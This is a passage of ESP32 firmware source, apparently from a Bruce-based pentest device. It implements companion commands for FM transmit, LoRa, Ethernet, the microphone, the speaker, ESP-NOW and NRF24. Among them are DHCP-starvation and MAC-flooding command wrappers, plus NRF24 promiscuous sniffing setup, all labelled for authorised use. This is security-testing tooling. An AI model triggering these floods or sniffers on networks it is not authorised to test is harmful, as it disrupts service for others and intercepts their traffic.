// exists only on hardware variants that wire the Si4713 for digital audio (the reference
// T-Embed CC1101 has no Si4713 fitted at all, so the 0x63 probe below gates it off and
// every fm_audio_* command replies ok:false "no FM module"). HARDWARE/LIB LIMITATION:
// the exact I2S pin routing and the Si4713 digital-format bits could not be validated on
// real hardware here; the TX reuses the board's I2S speaker pins (BCLK/WCLK/DOUT) as the
// assumed Si4713 audio bus and uses I2S_NUM_1 so it does not collide with the mic (which
// uses I2S_NUM_0).

// (base64 decode lives at file scope as companionB64decode(), shared with spkr_pcm_data)

static bool fmAudioActive = false;
static bool fmAudioMic = false; // true = onboard mic source, false = phone PCM source
static i2s_chan_handle_t fmTxChan = nullptr;
static const uint32_t FM_AUDIO_IN_RATE = 16000;  // phone/mic PCM rate (mono 16-bit)
static const uint32_t FM_AUDIO_TX_RATE = 32000;  // Si4713 digital min is 32 kHz (AN332)
static const int FM_RING_SAMPLES = 8192;         // ~0.5 s of 16 kHz mono PCM
static int16_t fmRing[FM_RING_SAMPLES];
static volatile int fmRingHead = 0;
static volatile int fmRingTail = 0;

static bool fmI2sTxBegin() {
    i2s_chan_config_t chan_cfg = I2S_CHANNEL_DEFAULT_CONFIG(I2S_NUM_1, I2S_ROLE_MASTER);
    if (i2s_new_channel(&chan_cfg, &fmTxChan, NULL) != ESP_OK) return false;
    i2s_std_config_t std_cfg = {
        .clk_cfg = I2S_STD_CLK_DEFAULT_CONFIG(FM_AUDIO_TX_RATE),
        .slot_cfg = I2S_STD_PHILIPS_SLOT_DEFAULT_CONFIG(I2S_DATA_BIT_WIDTH_16BIT, I2S_SLOT_MODE_STEREO),
        .gpio_cfg = {
                     // Reuse the board's I2S speaker pins; on FM-audio hardware these route
                     // to the Si4713 DCLK/DFS/DIN (hardware-dependent - see note above).
                     .mclk = I2S_GPIO_UNUSED,
                     .bclk = (gpio_num_t)BCLK,
                     .ws = (gpio_num_t)WCLK,
                     .dout = (gpio_num_t)DOUT,
                     .din = I2S_GPIO_UNUSED,
                     },
    };
    if (i2s_channel_init_std_mode(fmTxChan, &std_cfg) != ESP_OK) {
        i2s_del_channel(fmTxChan);
        fmTxChan = nullptr;
        return false;
    }
    if (i2s_channel_enable(fmTxChan) != ESP_OK) {
        i2s_del_channel(fmTxChan);
        fmTxChan = nullptr;
        return false;
    }
    return true;
}

static void fmI2sTxEnd() {
    if (fmTxChan) {
        i2s_channel_disable(fmTxChan);
        i2s_del_channel(fmTxChan);
        fmTxChan = nullptr;
    }
}

// Write a block of 16 kHz mono PCM to the TX channel: upsample x2 (16->32 kHz, sample
// duplication) and duplicate to L/R (mono->stereo). A short write timeout paces the
// stream to real time; on overrun the block is truncated (non-blocking by design).
static void fmWriteUpsampled(const int16_t *mono, int n) {
    static int16_t out[256 * 4]; // 256 mono samples -> 512 stereo frames (4 int16 each)
    if (n > 256) n = 256;
    int j = 0;
    for (int i = 0; i < n; i++) {
        int16_t s = mono[i];
        out[j++] = s;
        out[j++] = s; // frame 1: L, R
        out[j++] = s;
        out[j++] = s; // frame 2: L, R (x2 upsample)
    }
    if (!fmTxChan || j == 0) return;
    size_t wrote = 0;
    i2s_channel_write(fmTxChan, out, (size_t)j * sizeof(int16_t), &wrote, pdMS_TO_TICKS(10));
}

static void fmAudioStopInternal() {
    if (!fmAudioActive) return;
    fmAudioActive = false;
    fmI2sTxEnd();
    fm_stop();
    fmRingHead = fmRingTail = 0;
}

// fm_audio_begin <freqKHz> <phone|mic>
static void runFmAudioBegin(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int sp = args.indexOf(' ');
    if (sp < 0) {
        sendErr(id, 400, "usage: fm_audio_begin <freqKHz 87500..108000> <phone|mic>");
        return;
    }
    long khz = args.substring(0, sp).toInt();
    String src = args.substring(sp + 1);
    src.trim();
    if (khz < 87500 || khz > 108000) {
        sendErr(id, 400, "usage: fm_audio_begin <freqKHz 87500..108000> <phone|mic>");
        return;
    }
    bool mic = src.equalsIgnoreCase("mic");
    bool phone = src.equalsIgnoreCase("phone");
    if (!mic && !phone) {
        sendErr(id, 400, "source must be 'phone' or 'mic'");
        return;
    }
#if !defined(COMPANION_HAS_MIC)
    if (mic) {
        companionAckMsg(id, false, "no microphone on this board");
        return;
    }
#endif
    // Runtime capability gate: no Si4713 at 0x63 -> report cleanly (the board macro only
    // means the driver is compiled in, not that the chip is actually fitted/wired).
    if (!check_i2c_address(0x63)) {
        companionAckMsg(id, false, "no FM module");
        return;
    }
    if (fmAudioActive) fmAudioStopInternal();
    if (!fm_tx_digital_begin((uint16_t)(khz / 10), FM_AUDIO_TX_RATE)) {
        companionAckMsg(id, false, "no FM module");
        return;
    }
    if (!fmI2sTxBegin()) {
        fm_stop();
        companionAckMsg(id, false, "I2S init failed");
        return;
    }
    fmAudioMic = mic;
    fmRingHead = fmRingTail = 0;
    fmAudioActive = true;
    String out = "FM audio TX on " + String(khz / 1000.0, 2) + " MHz (" + (mic ? "mic" : "phone") + ")";
    companionAckMsg(id, true, out.c_str());
}

// fm_audio_data <base64 pcm>  (16 kHz mono 16-bit; only for the "phone" source)
static void runFmAudioData(const String &b64, uint32_t id) {
    if (!fmAudioActive || fmAudioMic) {
        sendAck(id, false); // not streaming, or mic source owns the audio
        return;
    }
    size_t outLen = 0;
    uint8_t *pcm = companionB64decode(b64, &outLen);
    if (!pcm) {
        sendAck(id, false);
        return;
    }
    int nSamples = (int)(outLen / 2);
    const int16_t *s = (const int16_t *)pcm;
    for (int i = 0; i < nSamples; i++) {
        int next = (fmRingHead + 1) % FM_RING_SAMPLES;
        if (next == fmRingTail) break; // ring full: drop the rest (non-blocking)
        fmRing[fmRingHead] = s[i];
        fmRingHead = next;
    }
    free(pcm);
    sendAck(id, true);
}

static void runFmAudioStop(uint32_t id) {
    fmAudioStopInternal();
    companionAckMsg(id, true, "FM audio stopped");
}

// Pump audio into the Si4713 I2S input. Called from the main companion loop.
static void fmAudioService() {
    if (!fmAudioActive || !fmTxChan) return;
    if (fmAudioMic) {
#if defined(COMPANION_HAS_MIC)
        // Reuse mic.cpp sampling (self-managed I2S on I2S_NUM_0; our TX is on I2S_NUM_1).
        // NOTE: mic_capture_samples() re-inits/deinits its I2S each call, so mic->FM audio
        // is choppy - acceptable for a first cut; a continuous mic path would need a shared
        // capture task. Phone source has no such gap.
        int16_t *samples = nullptr;
        uint32_t sr = 0;
        if (mic_capture_samples(256, FM_AUDIO_IN_RATE, 2.0f, &samples, &sr) && samples) {
            fmWriteUpsampled(samples, 256);
            free(samples);
        }
#endif
    } else {
        int16_t chunk[256];
        int n = 0;
        while (n < 256 && fmRingTail != fmRingHead) {
            chunk[n++] = fmRing[fmRingTail];
            fmRingTail = (fmRingTail + 1) % FM_RING_SAMPLES;
        }
        if (n > 0) fmWriteUpsampled(chunk, n);
    }
}
#endif // COMPANION_HAS_FM_AUDIO
#endif // COMPANION_HAS_FM

#ifndef COMPANION_HAS_FM
// Reply used when an FM command arrives on a board without an FM module.
static void sendNoFm(uint32_t id) {
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = false;
    d["out"] = "no FM module on this board";
    sendEnvelope(o);
}
#endif // !COMPANION_HAS_FM

// --- LoRa (SX127x / SX126x) commands --------------------------------------
// Headless parity for the LoRa chat radio, reusing modules/lora/LoRaRF.cpp's RadioLib driver via
// its lora_companion_* helpers. Boards without a LoRa chip still LINK and reply "no LoRa module".
// LEGAL NOTE: respect your region's ISM band / duty-cycle rules - authorized use only.
#if defined(COMPANION_HAS_LORA)
//   lora_config <freqMHz> [bwKHz] [sf] [cr]   (bw/sf/cr optional; defaults SF9, 31.25 kHz, 4/8)
static void runLoraConfig(const String &argsIn, uint32_t id) {
    String a = argsIn;
    a.trim();
    if (a.length() == 0) {
        sendErr(id, 400, "usage: lora_config <freqMHz> [bwKHz] [sf] [cr]");
        return;
    }
    // Split up to 4 whitespace-separated tokens.
    float freq = 0;
    float bw = 0;
    int sf = 0, cr = 0;
    int idx = 0;
    int from = 0;
    while (from < (int)a.length() && idx < 4) {
        int sp = a.indexOf(' ', from);
        String tok = (sp < 0) ? a.substring(from) : a.substring(from, sp);
        tok.trim();
        if (tok.length() > 0) {
            switch (idx) {
                case 0: freq = tok.toFloat(); break;
                case 1: bw = tok.toFloat(); break;
                case 2: sf = tok.toInt(); break;
                case 3: cr = tok.toInt(); break;
            }
            idx++;
        }
        if (sp < 0) break;
        from = sp + 1;
    }
    // Bounds: LoRa sub-GHz/2.4GHz bands, discrete SF 6..12, coding-rate denominator 5..8.
    if (freq < 100.0f || freq > 1100.0f) {
        sendErr(id, 400, "freqMHz out of range (100..1100)");
        return;
    }
    if (bw != 0 && (bw < 7.0f || bw > 510.0f)) {
        sendErr(id, 400, "bwKHz out of range (7..510)");
        return;
    }
    if (sf != 0 && (sf < 6 || sf > 12)) {
        sendErr(id, 400, "sf out of range (6..12)");
        return;
    }
    if (cr != 0 && (cr < 5 || cr > 8)) {
        sendErr(id, 400, "cr out of range (5..8)");
        return;
    }
    bool ok = lora_companion_begin(freq, bw, sf, cr);
    if (!ok) {
        companionAckMsg(id, false, "LoRa init failed (pins/radio)");
        return;
    }
    char out[80];
    snprintf(
        out, sizeof(out), "LoRa up @ %.3f MHz bw=%s sf=%s cr=%s", freq,
        bw != 0 ? String(bw, 2).c_str() : "def", sf != 0 ? String(sf).c_str() : "def",
        cr != 0 ? String(cr).c_str() : "def"
    );
    companionAckMsg(id, true, out);
}

//   lora_send <text>   (transmit one packet; requires a prior lora_config)
static void runLoraSend(const String &argsIn, uint32_t id) {
    String text = argsIn;
    if (text.length() == 0) {
        sendErr(id, 400, "usage: lora_send <text>");
        return;
    }
    if (!lora_companion_ready()) {
        companionAckMsg(id, false, "run lora_config first");
        return;
    }
    if (text.length() > 250) text = text.substring(0, 250); // LoRa payload cap
    bool ok = lora_companion_send(text);
    companionAckMsg(id, ok, ok ? "sent" : "LoRa send failed");
}

//   lora_recv <secs>   (listen up to secs; stream EVENT ev="lora.rx" {data,rssi,snr} per packet)
static void runLoraRecv(const String &argsIn, uint32_t id) {
    if (!lora_companion_ready()) {
        companionAckMsg(id, false, "run lora_config first");
        return;
    }
    int secs = argsIn.toInt();
    if (secs < 1) secs = 5;
    if (secs > 120) secs = 120; // bound the listen window
    uint32_t end = millis() + (uint32_t)secs * 1000;
    int count = 0;
    while ((int32_t)(millis() - end) < 0) {
        if (check(EscPress)) break;
        String data;
        float rssi = 0, snr = 0;
        if (lora_companion_poll(data, rssi, snr) == 1) {
            count++;
            JsonDocument out;
            beginEnvelope(out, MSG_EVENT, 0);
            JsonObject d = out["d"].to<JsonObject>();
            d["ev"] = "lora.rx";
            JsonObject r = d["data"].to<JsonObject>();
            r["data"] = data;
            r["rssi"] = rssi;
            r["snr"] = snr;
            sendEnvelope(out);
        } else {
            delay(5);
        }
    }
    char out[48];
    snprintf(out, sizeof(out), "received %d packet(s)", count);
    companionAckMsg(id, true, out);
}
#else // !COMPANION_HAS_LORA
static void sendNoLora(uint32_t id) { companionAckMsg(id, false, "no LoRa module on this board"); }
#endif // COMPANION_HAS_LORA

// --- Ethernet (W5500) commands --------------------------------------------
// Headless parity for the on-device Ethernet menu, reusing modules/ethernet/EthernetHelper.cpp
// (ETH.begin over SPI + link/IP state). Boards without a W5500 still LINK and reply "no Ethernet".
#if defined(COMPANION_HAS_ETH)
// Bring up the W5500 and wait (bounded, ESC-abortable) for link + DHCP lease. Returns the helper
// (connected or not) via *outUp; caller must eth->stop() + delete.
static EthernetHelper *ethBringUp(bool &outUp, uint32_t waitMs) {
    EthernetHelper *eth = new EthernetHelper();
    if (!eth->setup()) { // pins unset or W5500 not found
        delete eth;
        outUp = false;
        return nullptr;
    }
    uint32_t end = millis() + waitMs;
    while (!eth->is_connected() && (int32_t)(millis() - end) < 0) {
        if (check(EscPress)) break;
        delay(50);
    }
    outUp = eth->is_connected();
    return eth;
}

static void ethSendStatus(uint32_t id, bool up) {
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = up;
    JsonObject r = d["data"].to<JsonObject>();
    r["link"] = ETH.linkUp();
    r["up"] = up;
    r["ip"] = ETH.localIP().toString();
    r["gw"] = ETH.gatewayIP().toString();
    r["mask"] = ETH.subnetMask().toString();
    r["dns"] = ETH.dnsIP().toString();
    r["mac"] = ETH.macAddress();
    String out = up ? ("link up, ip " + ETH.localIP().toString()) : String("no link / no DHCP lease");
    d["out"] = out;
    sendEnvelope(o);
}

//   eth_status   (bring up the W5500, report link state + DHCP IP)
static void runEthStatus(uint32_t id) {
    bool up = false;
    EthernetHelper *eth = ethBringUp(up, 6000);
    if (!eth) {
        companionAckMsg(id, false, "W5500 not found");
        return;
    }
    ethSendStatus(id, up);
    eth->stop();
    delete eth;
}

//   eth_config <dhcp | static <ip> <gw> <mask> [dns]>
static void runEthConfig(const String &argsIn, uint32_t id) {
    String a = argsIn;
    a.trim();
    int sp = a.indexOf(' ');
    String mode = (sp < 0) ? a : a.substring(0, sp);
    mode.toLowerCase();
    if (mode != "dhcp" && mode != "static") {
        sendErr(id, 400, "usage: eth_config <dhcp | static <ip> <gw> <mask> [dns]>");
        return;
    }
    IPAddress ip, gw, mask, dns;
    if (mode == "static") {
        String rest = (sp < 0) ? String("") : a.substring(sp + 1);
        rest.trim();
        String toks[4];
        int ntok = 0;
        int from = 0;
        while (from < (int)rest.length() && ntok < 4) {
            int s = rest.indexOf(' ', from);
            String tok = (s < 0) ? rest.substring(from) : rest.substring(from, s);
            tok.trim();
            if (tok.length() > 0) toks[ntok++] = tok;
            if (s < 0) break;
            from = s + 1;
        }
        if (ntok < 3 || !ip.fromString(toks[0]) || !gw.fromString(toks[1]) || !mask.fromString(toks[2]) ||
            (ntok >= 4 && !dns.fromString(toks[3]))) {
            sendErr(id, 400, "usage: eth_config static <ip> <gw> <mask> [dns]");
            return;
        }
    }
    bool up = false;
    EthernetHelper *eth = ethBringUp(up, 2000); // short wait; reconfigure below then re-wait
    if (!eth) {
        companionAckMsg(id, false, "W5500 not found");
        return;
    }
    // dhcp -> all-INADDR_NONE reverts to DHCP; static -> apply the parsed addresses.
    if (mode == "dhcp") ETH.config();
    else ETH.config(ip, gw, mask, dns);
    uint32_t end = millis() + 6000;
    while (!ETH.linkUp() && (int32_t)(millis() - end) < 0) {
        if (check(EscPress)) break;
        delay(50);
    }
    up = (mode == "static") ? ETH.linkUp() : eth->is_connected();
    ethSendStatus(id, up);
    eth->stop();
    delete eth;
}

// Brucia: Ethernet DHCP-starvation parity. Reuses modules/ethernet/DHCPStarvation with the
// headless path (no GUI, bounded, ESC-abortable). Brings the W5500 up first. AUTHORIZED USE.
//   eth_dhcp_starve [secs]   (default 10s, 1..60)
static void runEthDhcpStarve(const String &argsIn, uint32_t id) {
    int secs = argsIn.length() ? argsIn.toInt() : 10;
    bool up = false;
    EthernetHelper *eth = ethBringUp(up, 4000);
    if (!eth) {
        companionAckMsg(id, false, "W5500 not found");
        return;
    }
    DHCPStarvation dhcp(true);
    int n = dhcp.run_headless(secs);
    eth->stop();
    delete eth;
    if (n < 0) {
        companionAckMsg(id, false, "no Ethernet interface to flood");
        return;
    }
    char msg[72];
    snprintf(msg, sizeof(msg), "sent %d DHCP DISCOVER packets", n);
    companionAckMsg(id, true, msg);
}

// Brucia: Ethernet MAC-flooding parity. Reuses modules/ethernet/MACFlooding headless path.
// AUTHORIZED USE.
//   eth_mac_flood [secs]   (default 10s, 1..60)
static void runEthMacFlood(const String &argsIn, uint32_t id) {
    int secs = argsIn.length() ? argsIn.toInt() : 10;
    bool up = false;
    EthernetHelper *eth = ethBringUp(up, 4000);
    if (!eth) {
        companionAckMsg(id, false, "W5500 not found");
        return;
    }
    MACFlooding mf(true);
    int n = mf.run_headless(secs);
    eth->stop();
    delete eth;
    if (n < 0) {
        companionAckMsg(id, false, "no Ethernet interface to flood");
        return;
    }
    char msg[72];
    snprintf(msg, sizeof(msg), "sent %d flood frames", n);
    companionAckMsg(id, true, msg);
}
#else // !COMPANION_HAS_ETH
static void sendNoEth(uint32_t id) { companionAckMsg(id, false, "no Ethernet on this board"); }
#endif // COMPANION_HAS_ETH

// --- mic.spectrum stream: sample the onboard PDM mic, run a small FFT, and emit
//     EVENT ev="mic.spectrum" data { bins:[16], level:0..100 } at a modest rate.
//     Reuses mic.cpp's mic_capture_samples() (self-managed I2S init/deinit). ---
#ifdef COMPANION_HAS_MIC
static bool subMic = false;
static uint32_t micLastEmit = 0;
static const uint32_t MIC_PERIOD_MS = 120; // emit roughly 8x/second
static const int MIC_FFT_N = 256;          // short window per service call
static const int MIC_BINS = 16;            // small, so one frame holds the array

static void micStart() {
    subMic = true;
    micLastEmit = 0;
}

static void micStop() { subMic = false; }

static void micService() {
    if (!subMic) return;
    if (millis() - micLastEmit < MIC_PERIOD_MS) return;
    micLastEmit = millis();

    int16_t *samples = nullptr;
    uint32_t sr = 0;
    if (!mic_capture_samples((uint32_t)MIC_FFT_N, 16000, 1.0f, &samples, &sr) || !samples) return;

    fft_config_t *plan = fft_init(MIC_FFT_N, FFT_REAL, FFT_FORWARD, NULL, NULL);
    if (!plan) {
        free(samples);
        return;
    }

    double sumSq = 0;
    for (int i = 0; i < MIC_FFT_N; i++) {
        float s = (float)samples[i] / 32768.0f;
        plan->input[i] = s;
        sumSq += (double)s * s;
    }
    fft_execute(plan);

    const int usable = MIC_FFT_N / 2; // real FFT: magnitude bins 0..N/2
    int per = usable / MIC_BINS;
    if (per < 1) per = 1;
    uint8_t bins[MIC_BINS];
    for (int b = 0; b < MIC_BINS; b++) {
        float acc = 0;
        int cnt = 0;
        int start = 1 + b * per; // skip the DC bin
        for (int k = start; k < start + per && k < usable; k++) {
            float re = plan->output[2 * k];
            float im = plan->output[2 * k + 1];
            acc += sqrtf(re * re + im * im);
            cnt++;
        }
        float mag = cnt ? acc / cnt : 0.0f;
        int v = (int)(mag * 400.0f); // scale magnitude to ~0..100
        if (v > 100) v = 100;
        if (v < 0) v = 0;
        bins[b] = (uint8_t)v;
    }
    fft_destroy(plan);
    free(samples);

    float rms = sqrtf((float)(sumSq / (double)MIC_FFT_N));
    int level = (int)(rms * 300.0f);
    if (level > 100) level = 100;
    if (level < 0) level = 0;

    JsonDocument out;
    beginEnvelope(out, MSG_EVENT, 0);
    JsonObject d = out["d"].to<JsonObject>();
    d["ev"] = "mic.spectrum";
    JsonObject data = d["data"].to<JsonObject>();
    JsonArray arr = data["bins"].to<JsonArray>();
    for (int b = 0; b < MIC_BINS; b++) arr.add(bins[b]);
    data["level"] = level;
    sendEnvelope(out);
}

// --- mic.pcm stream: raw continuous mic PCM for phone-side DSP (SSTV/tone/FFT). ---
//     EVENT ev="mic.pcm" d { sr:16000, pcm:"<base64 S16LE mono>" }, ~2048 samples/chunk.
//     Uses mic_stream_begin/read/end() (persistent I2S) so chunks are gapless; the plain
//     mic.spectrum sampler re-inits I2S per call and would leave holes. The I2S peripheral
//     is opened lazily on first service and released on micPcmStop(), so it never contends
//     with mic.spectrum (both use I2S_NUM_0 but only one stream runs at a time).
#define MIC_PCM_CHUNK 2048                 // samples per EVENT: 4096 bytes -> ~5462 b64 < frame
static bool subPcm = false;                // phone subscribed to mic.pcm
static bool micPcmOpen = false;            // the continuous I2S capture is running
static int micPcmFill = 0;                 // samples accumulated in micPcmBuf so far
static int16_t micPcmBuf[MIC_PCM_CHUNK];   // assembles one chunk across service calls

static void micPcmStart() {
    subPcm = true;
    micPcmFill = 0;
    // The I2S peripheral is opened lazily in micPcmService() (first call), so a transient
    // init failure just retries instead of failing the SUB ack.
}

static void micPcmStop() {
    subPcm = false;
    micPcmFill = 0;
    if (micPcmOpen) {
        mic_stream_end();
        micPcmOpen = false;
    }
}

static void micPcmService() {
    if (!subPcm) return;
    if (!micPcmOpen) {
        if (!mic_stream_begin(16000, 2.0f)) return; // retry next loop
        micPcmOpen = true;
    }
    // Drain whatever the I2S DMA has ready (non-blocking) into the chunk buffer; emit when full.
    int want = MIC_PCM_CHUNK - micPcmFill;
    int got = mic_stream_read(micPcmBuf + micPcmFill, want);
    if (got > 0) micPcmFill += got;
    if (micPcmFill < MIC_PCM_CHUNK) return; // not a full chunk yet

    String b64 = b64encode((const uint8_t *)micPcmBuf, (size_t)micPcmFill * sizeof(int16_t));
    micPcmFill = 0;

    JsonDocument out;
    beginEnvelope(out, MSG_EVENT, 0);
    JsonObject d = out["d"].to<JsonObject>();
    d["ev"] = "mic.pcm";
    d["sr"] = 16000;
    d["pcm"] = b64;
    sendEnvelope(out);
}
#endif // COMPANION_HAS_MIC

// --- Onboard speaker (NS4168 / MAX98357A) companion commands ------------------------------
//   speaker_tone <freqHz> <ms> : play a tone on the onboard I2S speaker.
//   speaker_play <path>        : play an audio file (WAV/MP3/...) from SD/LittleFS.
// Both reuse modules/others/audio.cpp. Guarded by HAS_NS4168_SPKR; boards without the onboard
// speaker reply ok:false "no speaker" at the dispatch site.
#if defined(HAS_NS4168_SPKR)
static void runSpeakerTone(const String &args, uint32_t id) {
    String a = args;
    a.trim();
    int sp = a.indexOf(' ');
    long freq = (sp < 0 ? a : a.substring(0, sp)).toInt();
    long ms = (sp < 0) ? 0 : a.substring(sp + 1).toInt();
    if (freq <= 0 || freq > 20000) {
        sendErr(id, 400, "usage: speaker_tone <freqHz 1..20000> <ms>");
        return;
    }
    if (ms <= 0) ms = 200;    // sensible default
    if (ms > 10000) ms = 10000; // clamp to 10s (playTone blocks for the duration)
    // playTone() is a no-op when sound is globally muted, and its output gain scales with
    // soundVolume - a saved volume of 0 (or very low) produces NO audible output even with
    // sound enabled. For an explicit, phone-requested tone, force both enabled AND an audible
    // volume floor, then restore (in-memory only; not persisted to flash). This is the likely
    // reason "speaker_tone produces no sound" when the device's saved UI volume is muted/low.
    int prevSound = bruceConfig.soundEnabled;
    int prevVol = bruceConfig.soundVolume;
    bruceConfig.soundEnabled = 1;
    if (bruceConfig.soundVolume < 60) bruceConfig.soundVolume = 80; // audible floor
    playTone((unsigned int)freq, (unsigned long)ms, 0); // square wave -> I2S
    bruceConfig.soundEnabled = prevSound;
    bruceConfig.soundVolume = prevVol;
    String out = "played " + String(freq) + "Hz for " + String(ms) + "ms";
    companionAckMsg(id, true, out.c_str());
}

static void runSpeakerPlay(const String &args, uint32_t id) {
    String path = args;
    path.trim();
    if (path.length() == 0) {
        sendErr(id, 400, "usage: speaker_play <path>");
        return;
    }
    if (!path.startsWith("/")) path = "/" + path;
    FS *fs;
    if (!getFsStorage(fs)) {
        companionAckMsg(id, false, "no storage");
        return;
    }
    if (!fs->exists(path)) {
        companionAckMsg(id, false, "file not found");
        return;
    }
    // Force sound enabled + an audible volume floor for this explicit phone-requested playback
    // (the output gain scales with soundVolume; a muted/low saved volume yields silence).
    int prevSound = bruceConfig.soundEnabled;
    int prevVol = bruceConfig.soundVolume;
    bruceConfig.soundEnabled = 1;
    if (bruceConfig.soundVolume < 60) bruceConfig.soundVolume = 80; // audible floor
    bool ok = playAudioFile(fs, path, PLAYBACK_BLOCKING); // decode -> I2S (blocks until done)
    bruceConfig.soundEnabled = prevSound;
    bruceConfig.soundVolume = prevVol;
    String out = ok ? ("played " + path) : ("playback failed: " + path);
    companionAckMsg(id, ok, out.c_str());
}

// --- Streamed raw-PCM speaker playback (spkr_pcm_begin / spkr_pcm_data / spkr_pcm_stop). ---
//     Modeled on the fm_audio_* path but routed to the onboard I2S speaker via audio.cpp's
//     audio_pcm_* helpers (AudioOutputI2S, auto-allocated I2S peripheral - distinct from the
//     FM path on I2S_NUM_1 and the mic on I2S_NUM_0). S16LE mono, 16 kHz.
static bool spkrPcmActive = false;

static void runSpkrPcmBegin(uint32_t sr, uint32_t id) {
    if (sr == 0) sr = 16000;
    // Mic and speaker are half-duplex: if a mic.pcm capture is live, stop it so the onboard
    // audio peripherals do not contend while we play back.
#if defined(COMPANION_HAS_MIC)
    micPcmStop();
#endif
    if (spkrPcmActive) audio_pcm_end(); // restart cleanly on a repeated begin
    if (!audio_pcm_begin(sr)) {
        spkrPcmActive = false;
        companionAckMsg(id, false, "speaker init failed");
        return;
    }
    spkrPcmActive = true;
    sendAck(id, true);
}

static void runSpkrPcmData(const String &b64, uint32_t id) {
    if (!spkrPcmActive) {
        sendAck(id, false); // not streaming (missing spkr_pcm_begin)
        return;
    }
    size_t outLen = 0;
    uint8_t *pcm = companionB64decode(b64, &outLen);
    if (!pcm) {
        sendAck(id, false);
        return;
    }
    int nSamples = (int)(outLen / sizeof(int16_t));
    audio_pcm_write((const int16_t *)pcm, nSamples);
    free(pcm);
    sendAck(id, true);
}

static void runSpkrPcmStop(uint32_t id) {
    if (spkrPcmActive) {
        audio_pcm_end();
        spkrPcmActive = false;
    }
    companionAckMsg(id, true, "speaker PCM stopped");
}
#endif // HAS_NS4168_SPKR

// --- Onboard microphone record command ----------------------------------------------------
//   mic_record <secs 1..30> : record the mic to a WAV on SD. Reuses mic.cpp's
//   mic_record_wav_to_path() (self-managed I2S + WAV header writer). Guarded by the mic macro.
#if defined(COMPANION_HAS_MIC)
static void runMicRecord(const String &args, uint32_t id) {
    String a = args;
    a.trim();
    long secs = a.toInt();
    if (secs < 1) secs = 1;   // clamp 1..30
    if (secs > 30) secs = 30;
    FS *fs;
    if (!getFsStorage(fs)) {
        companionAckMsg(id, false, "no storage");
        return;
    }
    String path = "/recordings/rec_" + String((uint32_t)millis()) + ".wav";
    uint32_t outBytes = 0;
    bool ok = mic_record_wav_to_path(fs, path, (uint32_t)secs * 1000, &outBytes, 2.0f, nullptr);
    if (!ok) {
        companionAckMsg(id, false, "mic record failed");
        return;
    }
    uint32_t nSamples = outBytes > 44 ? (outBytes - 44) / 2 : 0; // 16-bit mono PCM after 44B header
    String out = "saved " + path + " (" + String(nSamples) + " samples)";
    companionAckMsg(id, true, out.c_str());
}
#endif // COMPANION_HAS_MIC

// --- ESP-NOW broadcast command ------------------------------------------------------------
//   espnow_send <message> : one-shot ESP-NOW broadcast. Reuses the Connect module's
//   EspConnection::Message wire struct and mirrors esp_connection.cpp::beginEspnow() +
//   createMessage() + esp_now_send() so a Bruce device running Connect receive picks it up.
//   Minimal and non-interactive (no peer-discovery menu). Dropped on lite builds.
#if !defined(LITE_VERSION)
static void runEspnowSend(const String &args, uint32_t id) {
    String text = args;
    // Keep interior spaces; only strip a trailing CR/LF the transport may have appended.
    while (text.length() &&
           (text.charAt(text.length() - 1) == '\r' || text.charAt(text.length() - 1) == '\n'))
        text.remove(text.length() - 1);
    if (text.length() == 0) {
        sendErr(id, 400, "usage: espnow_send <message>");
        return;
    }
    if ((int)text.length() >= ESP_DATA_SIZE) text = text.substring(0, ESP_DATA_SIZE - 1);

    static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    // ESP-NOW needs the Wi-Fi driver STARTED. In companion mode the radio may be off or left in
    // AP mode by another feature, so force STA (this calls esp_wifi_start) before init. Without
    // this, esp_now_init() fails and the broadcast silently goes nowhere (reported: "doesn't
    // work"). WiFi.disconnect(false) drops any stale STA association but keeps the driver up.
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(false);
    esp_err_t initRes = esp_now_init();
    // ESP_OK on first init; ESP_ERR_ESPNOW_EXIST means it was already up (fine). Anything else is
    // a real failure (usually the Wi-Fi driver not running) - report it honestly instead of
    // pretending the send happened.
    if (initRes != ESP_OK && initRes != ESP_ERR_ESPNOW_EXIST) {
        companionAckMsg(id, false, esp_err_to_name(initRes));
        return;
    }
    if (!esp_now_is_peer_exist(bcast)) {
        esp_now_peer_info_t peer = {};
        memcpy(peer.peer_addr, bcast, 6);
        peer.channel = 0; // use the current Wi-Fi channel
        peer.encrypt = false;
        esp_err_t peerRes = esp_now_add_peer(&peer);
        if (peerRes != ESP_OK) {
            companionAckMsg(id, false, esp_err_to_name(peerRes));
            return;
        }
    }
    EspConnection::Message msg; // Connect wire format (<=250 B)
    memset(&msg, 0, sizeof(msg));
    msg.dataSize = text.length();
    msg.totalBytes = text.length();
    msg.bytesSent = text.length();
    msg.done = true;
    strncpy(msg.data, text.c_str(), ESP_DATA_SIZE - 1);
    esp_err_t res = esp_now_send(bcast, (uint8_t *)&msg, sizeof(msg));
    if (res == ESP_OK) {
        String out = "broadcast " + String((int)text.length()) + " bytes via ESP-NOW";
        companionAckMsg(id, true, out.c_str());
    } else {
        companionAckMsg(id, false, esp_err_to_name(res));
    }
}
#endif // !LITE_VERSION

// --- NRF24 (2.4GHz) companion commands -------------------------------------------------
// AUTHORIZED / LAB USE ONLY. These probe the 2.4GHz ISM band (shared by BLE, Wi-Fi, Zigbee
// and proprietary Nordic ESB links). Listening is passive; do not use against devices you do
// not own or are not authorized to test. All features reuse Bruce's existing NRF24 modules and
// are gated by a runtime module-presence probe (companionNrf24Present) so a board that has the
// wiring but no module attached cleanly reports "no NRF24 module".
#if defined(COMPANION_HAS_NRF24)

// Shared promiscuous radio bring-up, mirroring nrf_spectrum.cpp / nrf_mousejack.cpp.
static bool companionNrf24Begin() {
    if (!nrf_start(NRF_MODE_SPI)) return false; // SPI only (companion is headless)
    NRFradio.setAutoAck(false);
    NRFradio.disableCRC();
    NRFradio.setAddressWidth(2); // 2-byte "noise" addresses - a reverse-engineering trick
    const uint8_t noiseAddress[][2] = {
        {0x55, 0x55}, {0xAA, 0xAA}, {0xA0, 0xAA}, {0xAB, 0xAA}, {0xAC, 0xAA}, {0xAD, 0xAA}
    };
    for (uint8_t i = 0; i < 6; i++) NRFradio.openReadingPipe(i, noiseAddress[i]);
    return true;
}

// nrf24_scan <secs>: 2.4GHz channel-activity sweep across the 80 nRF channels, reusing
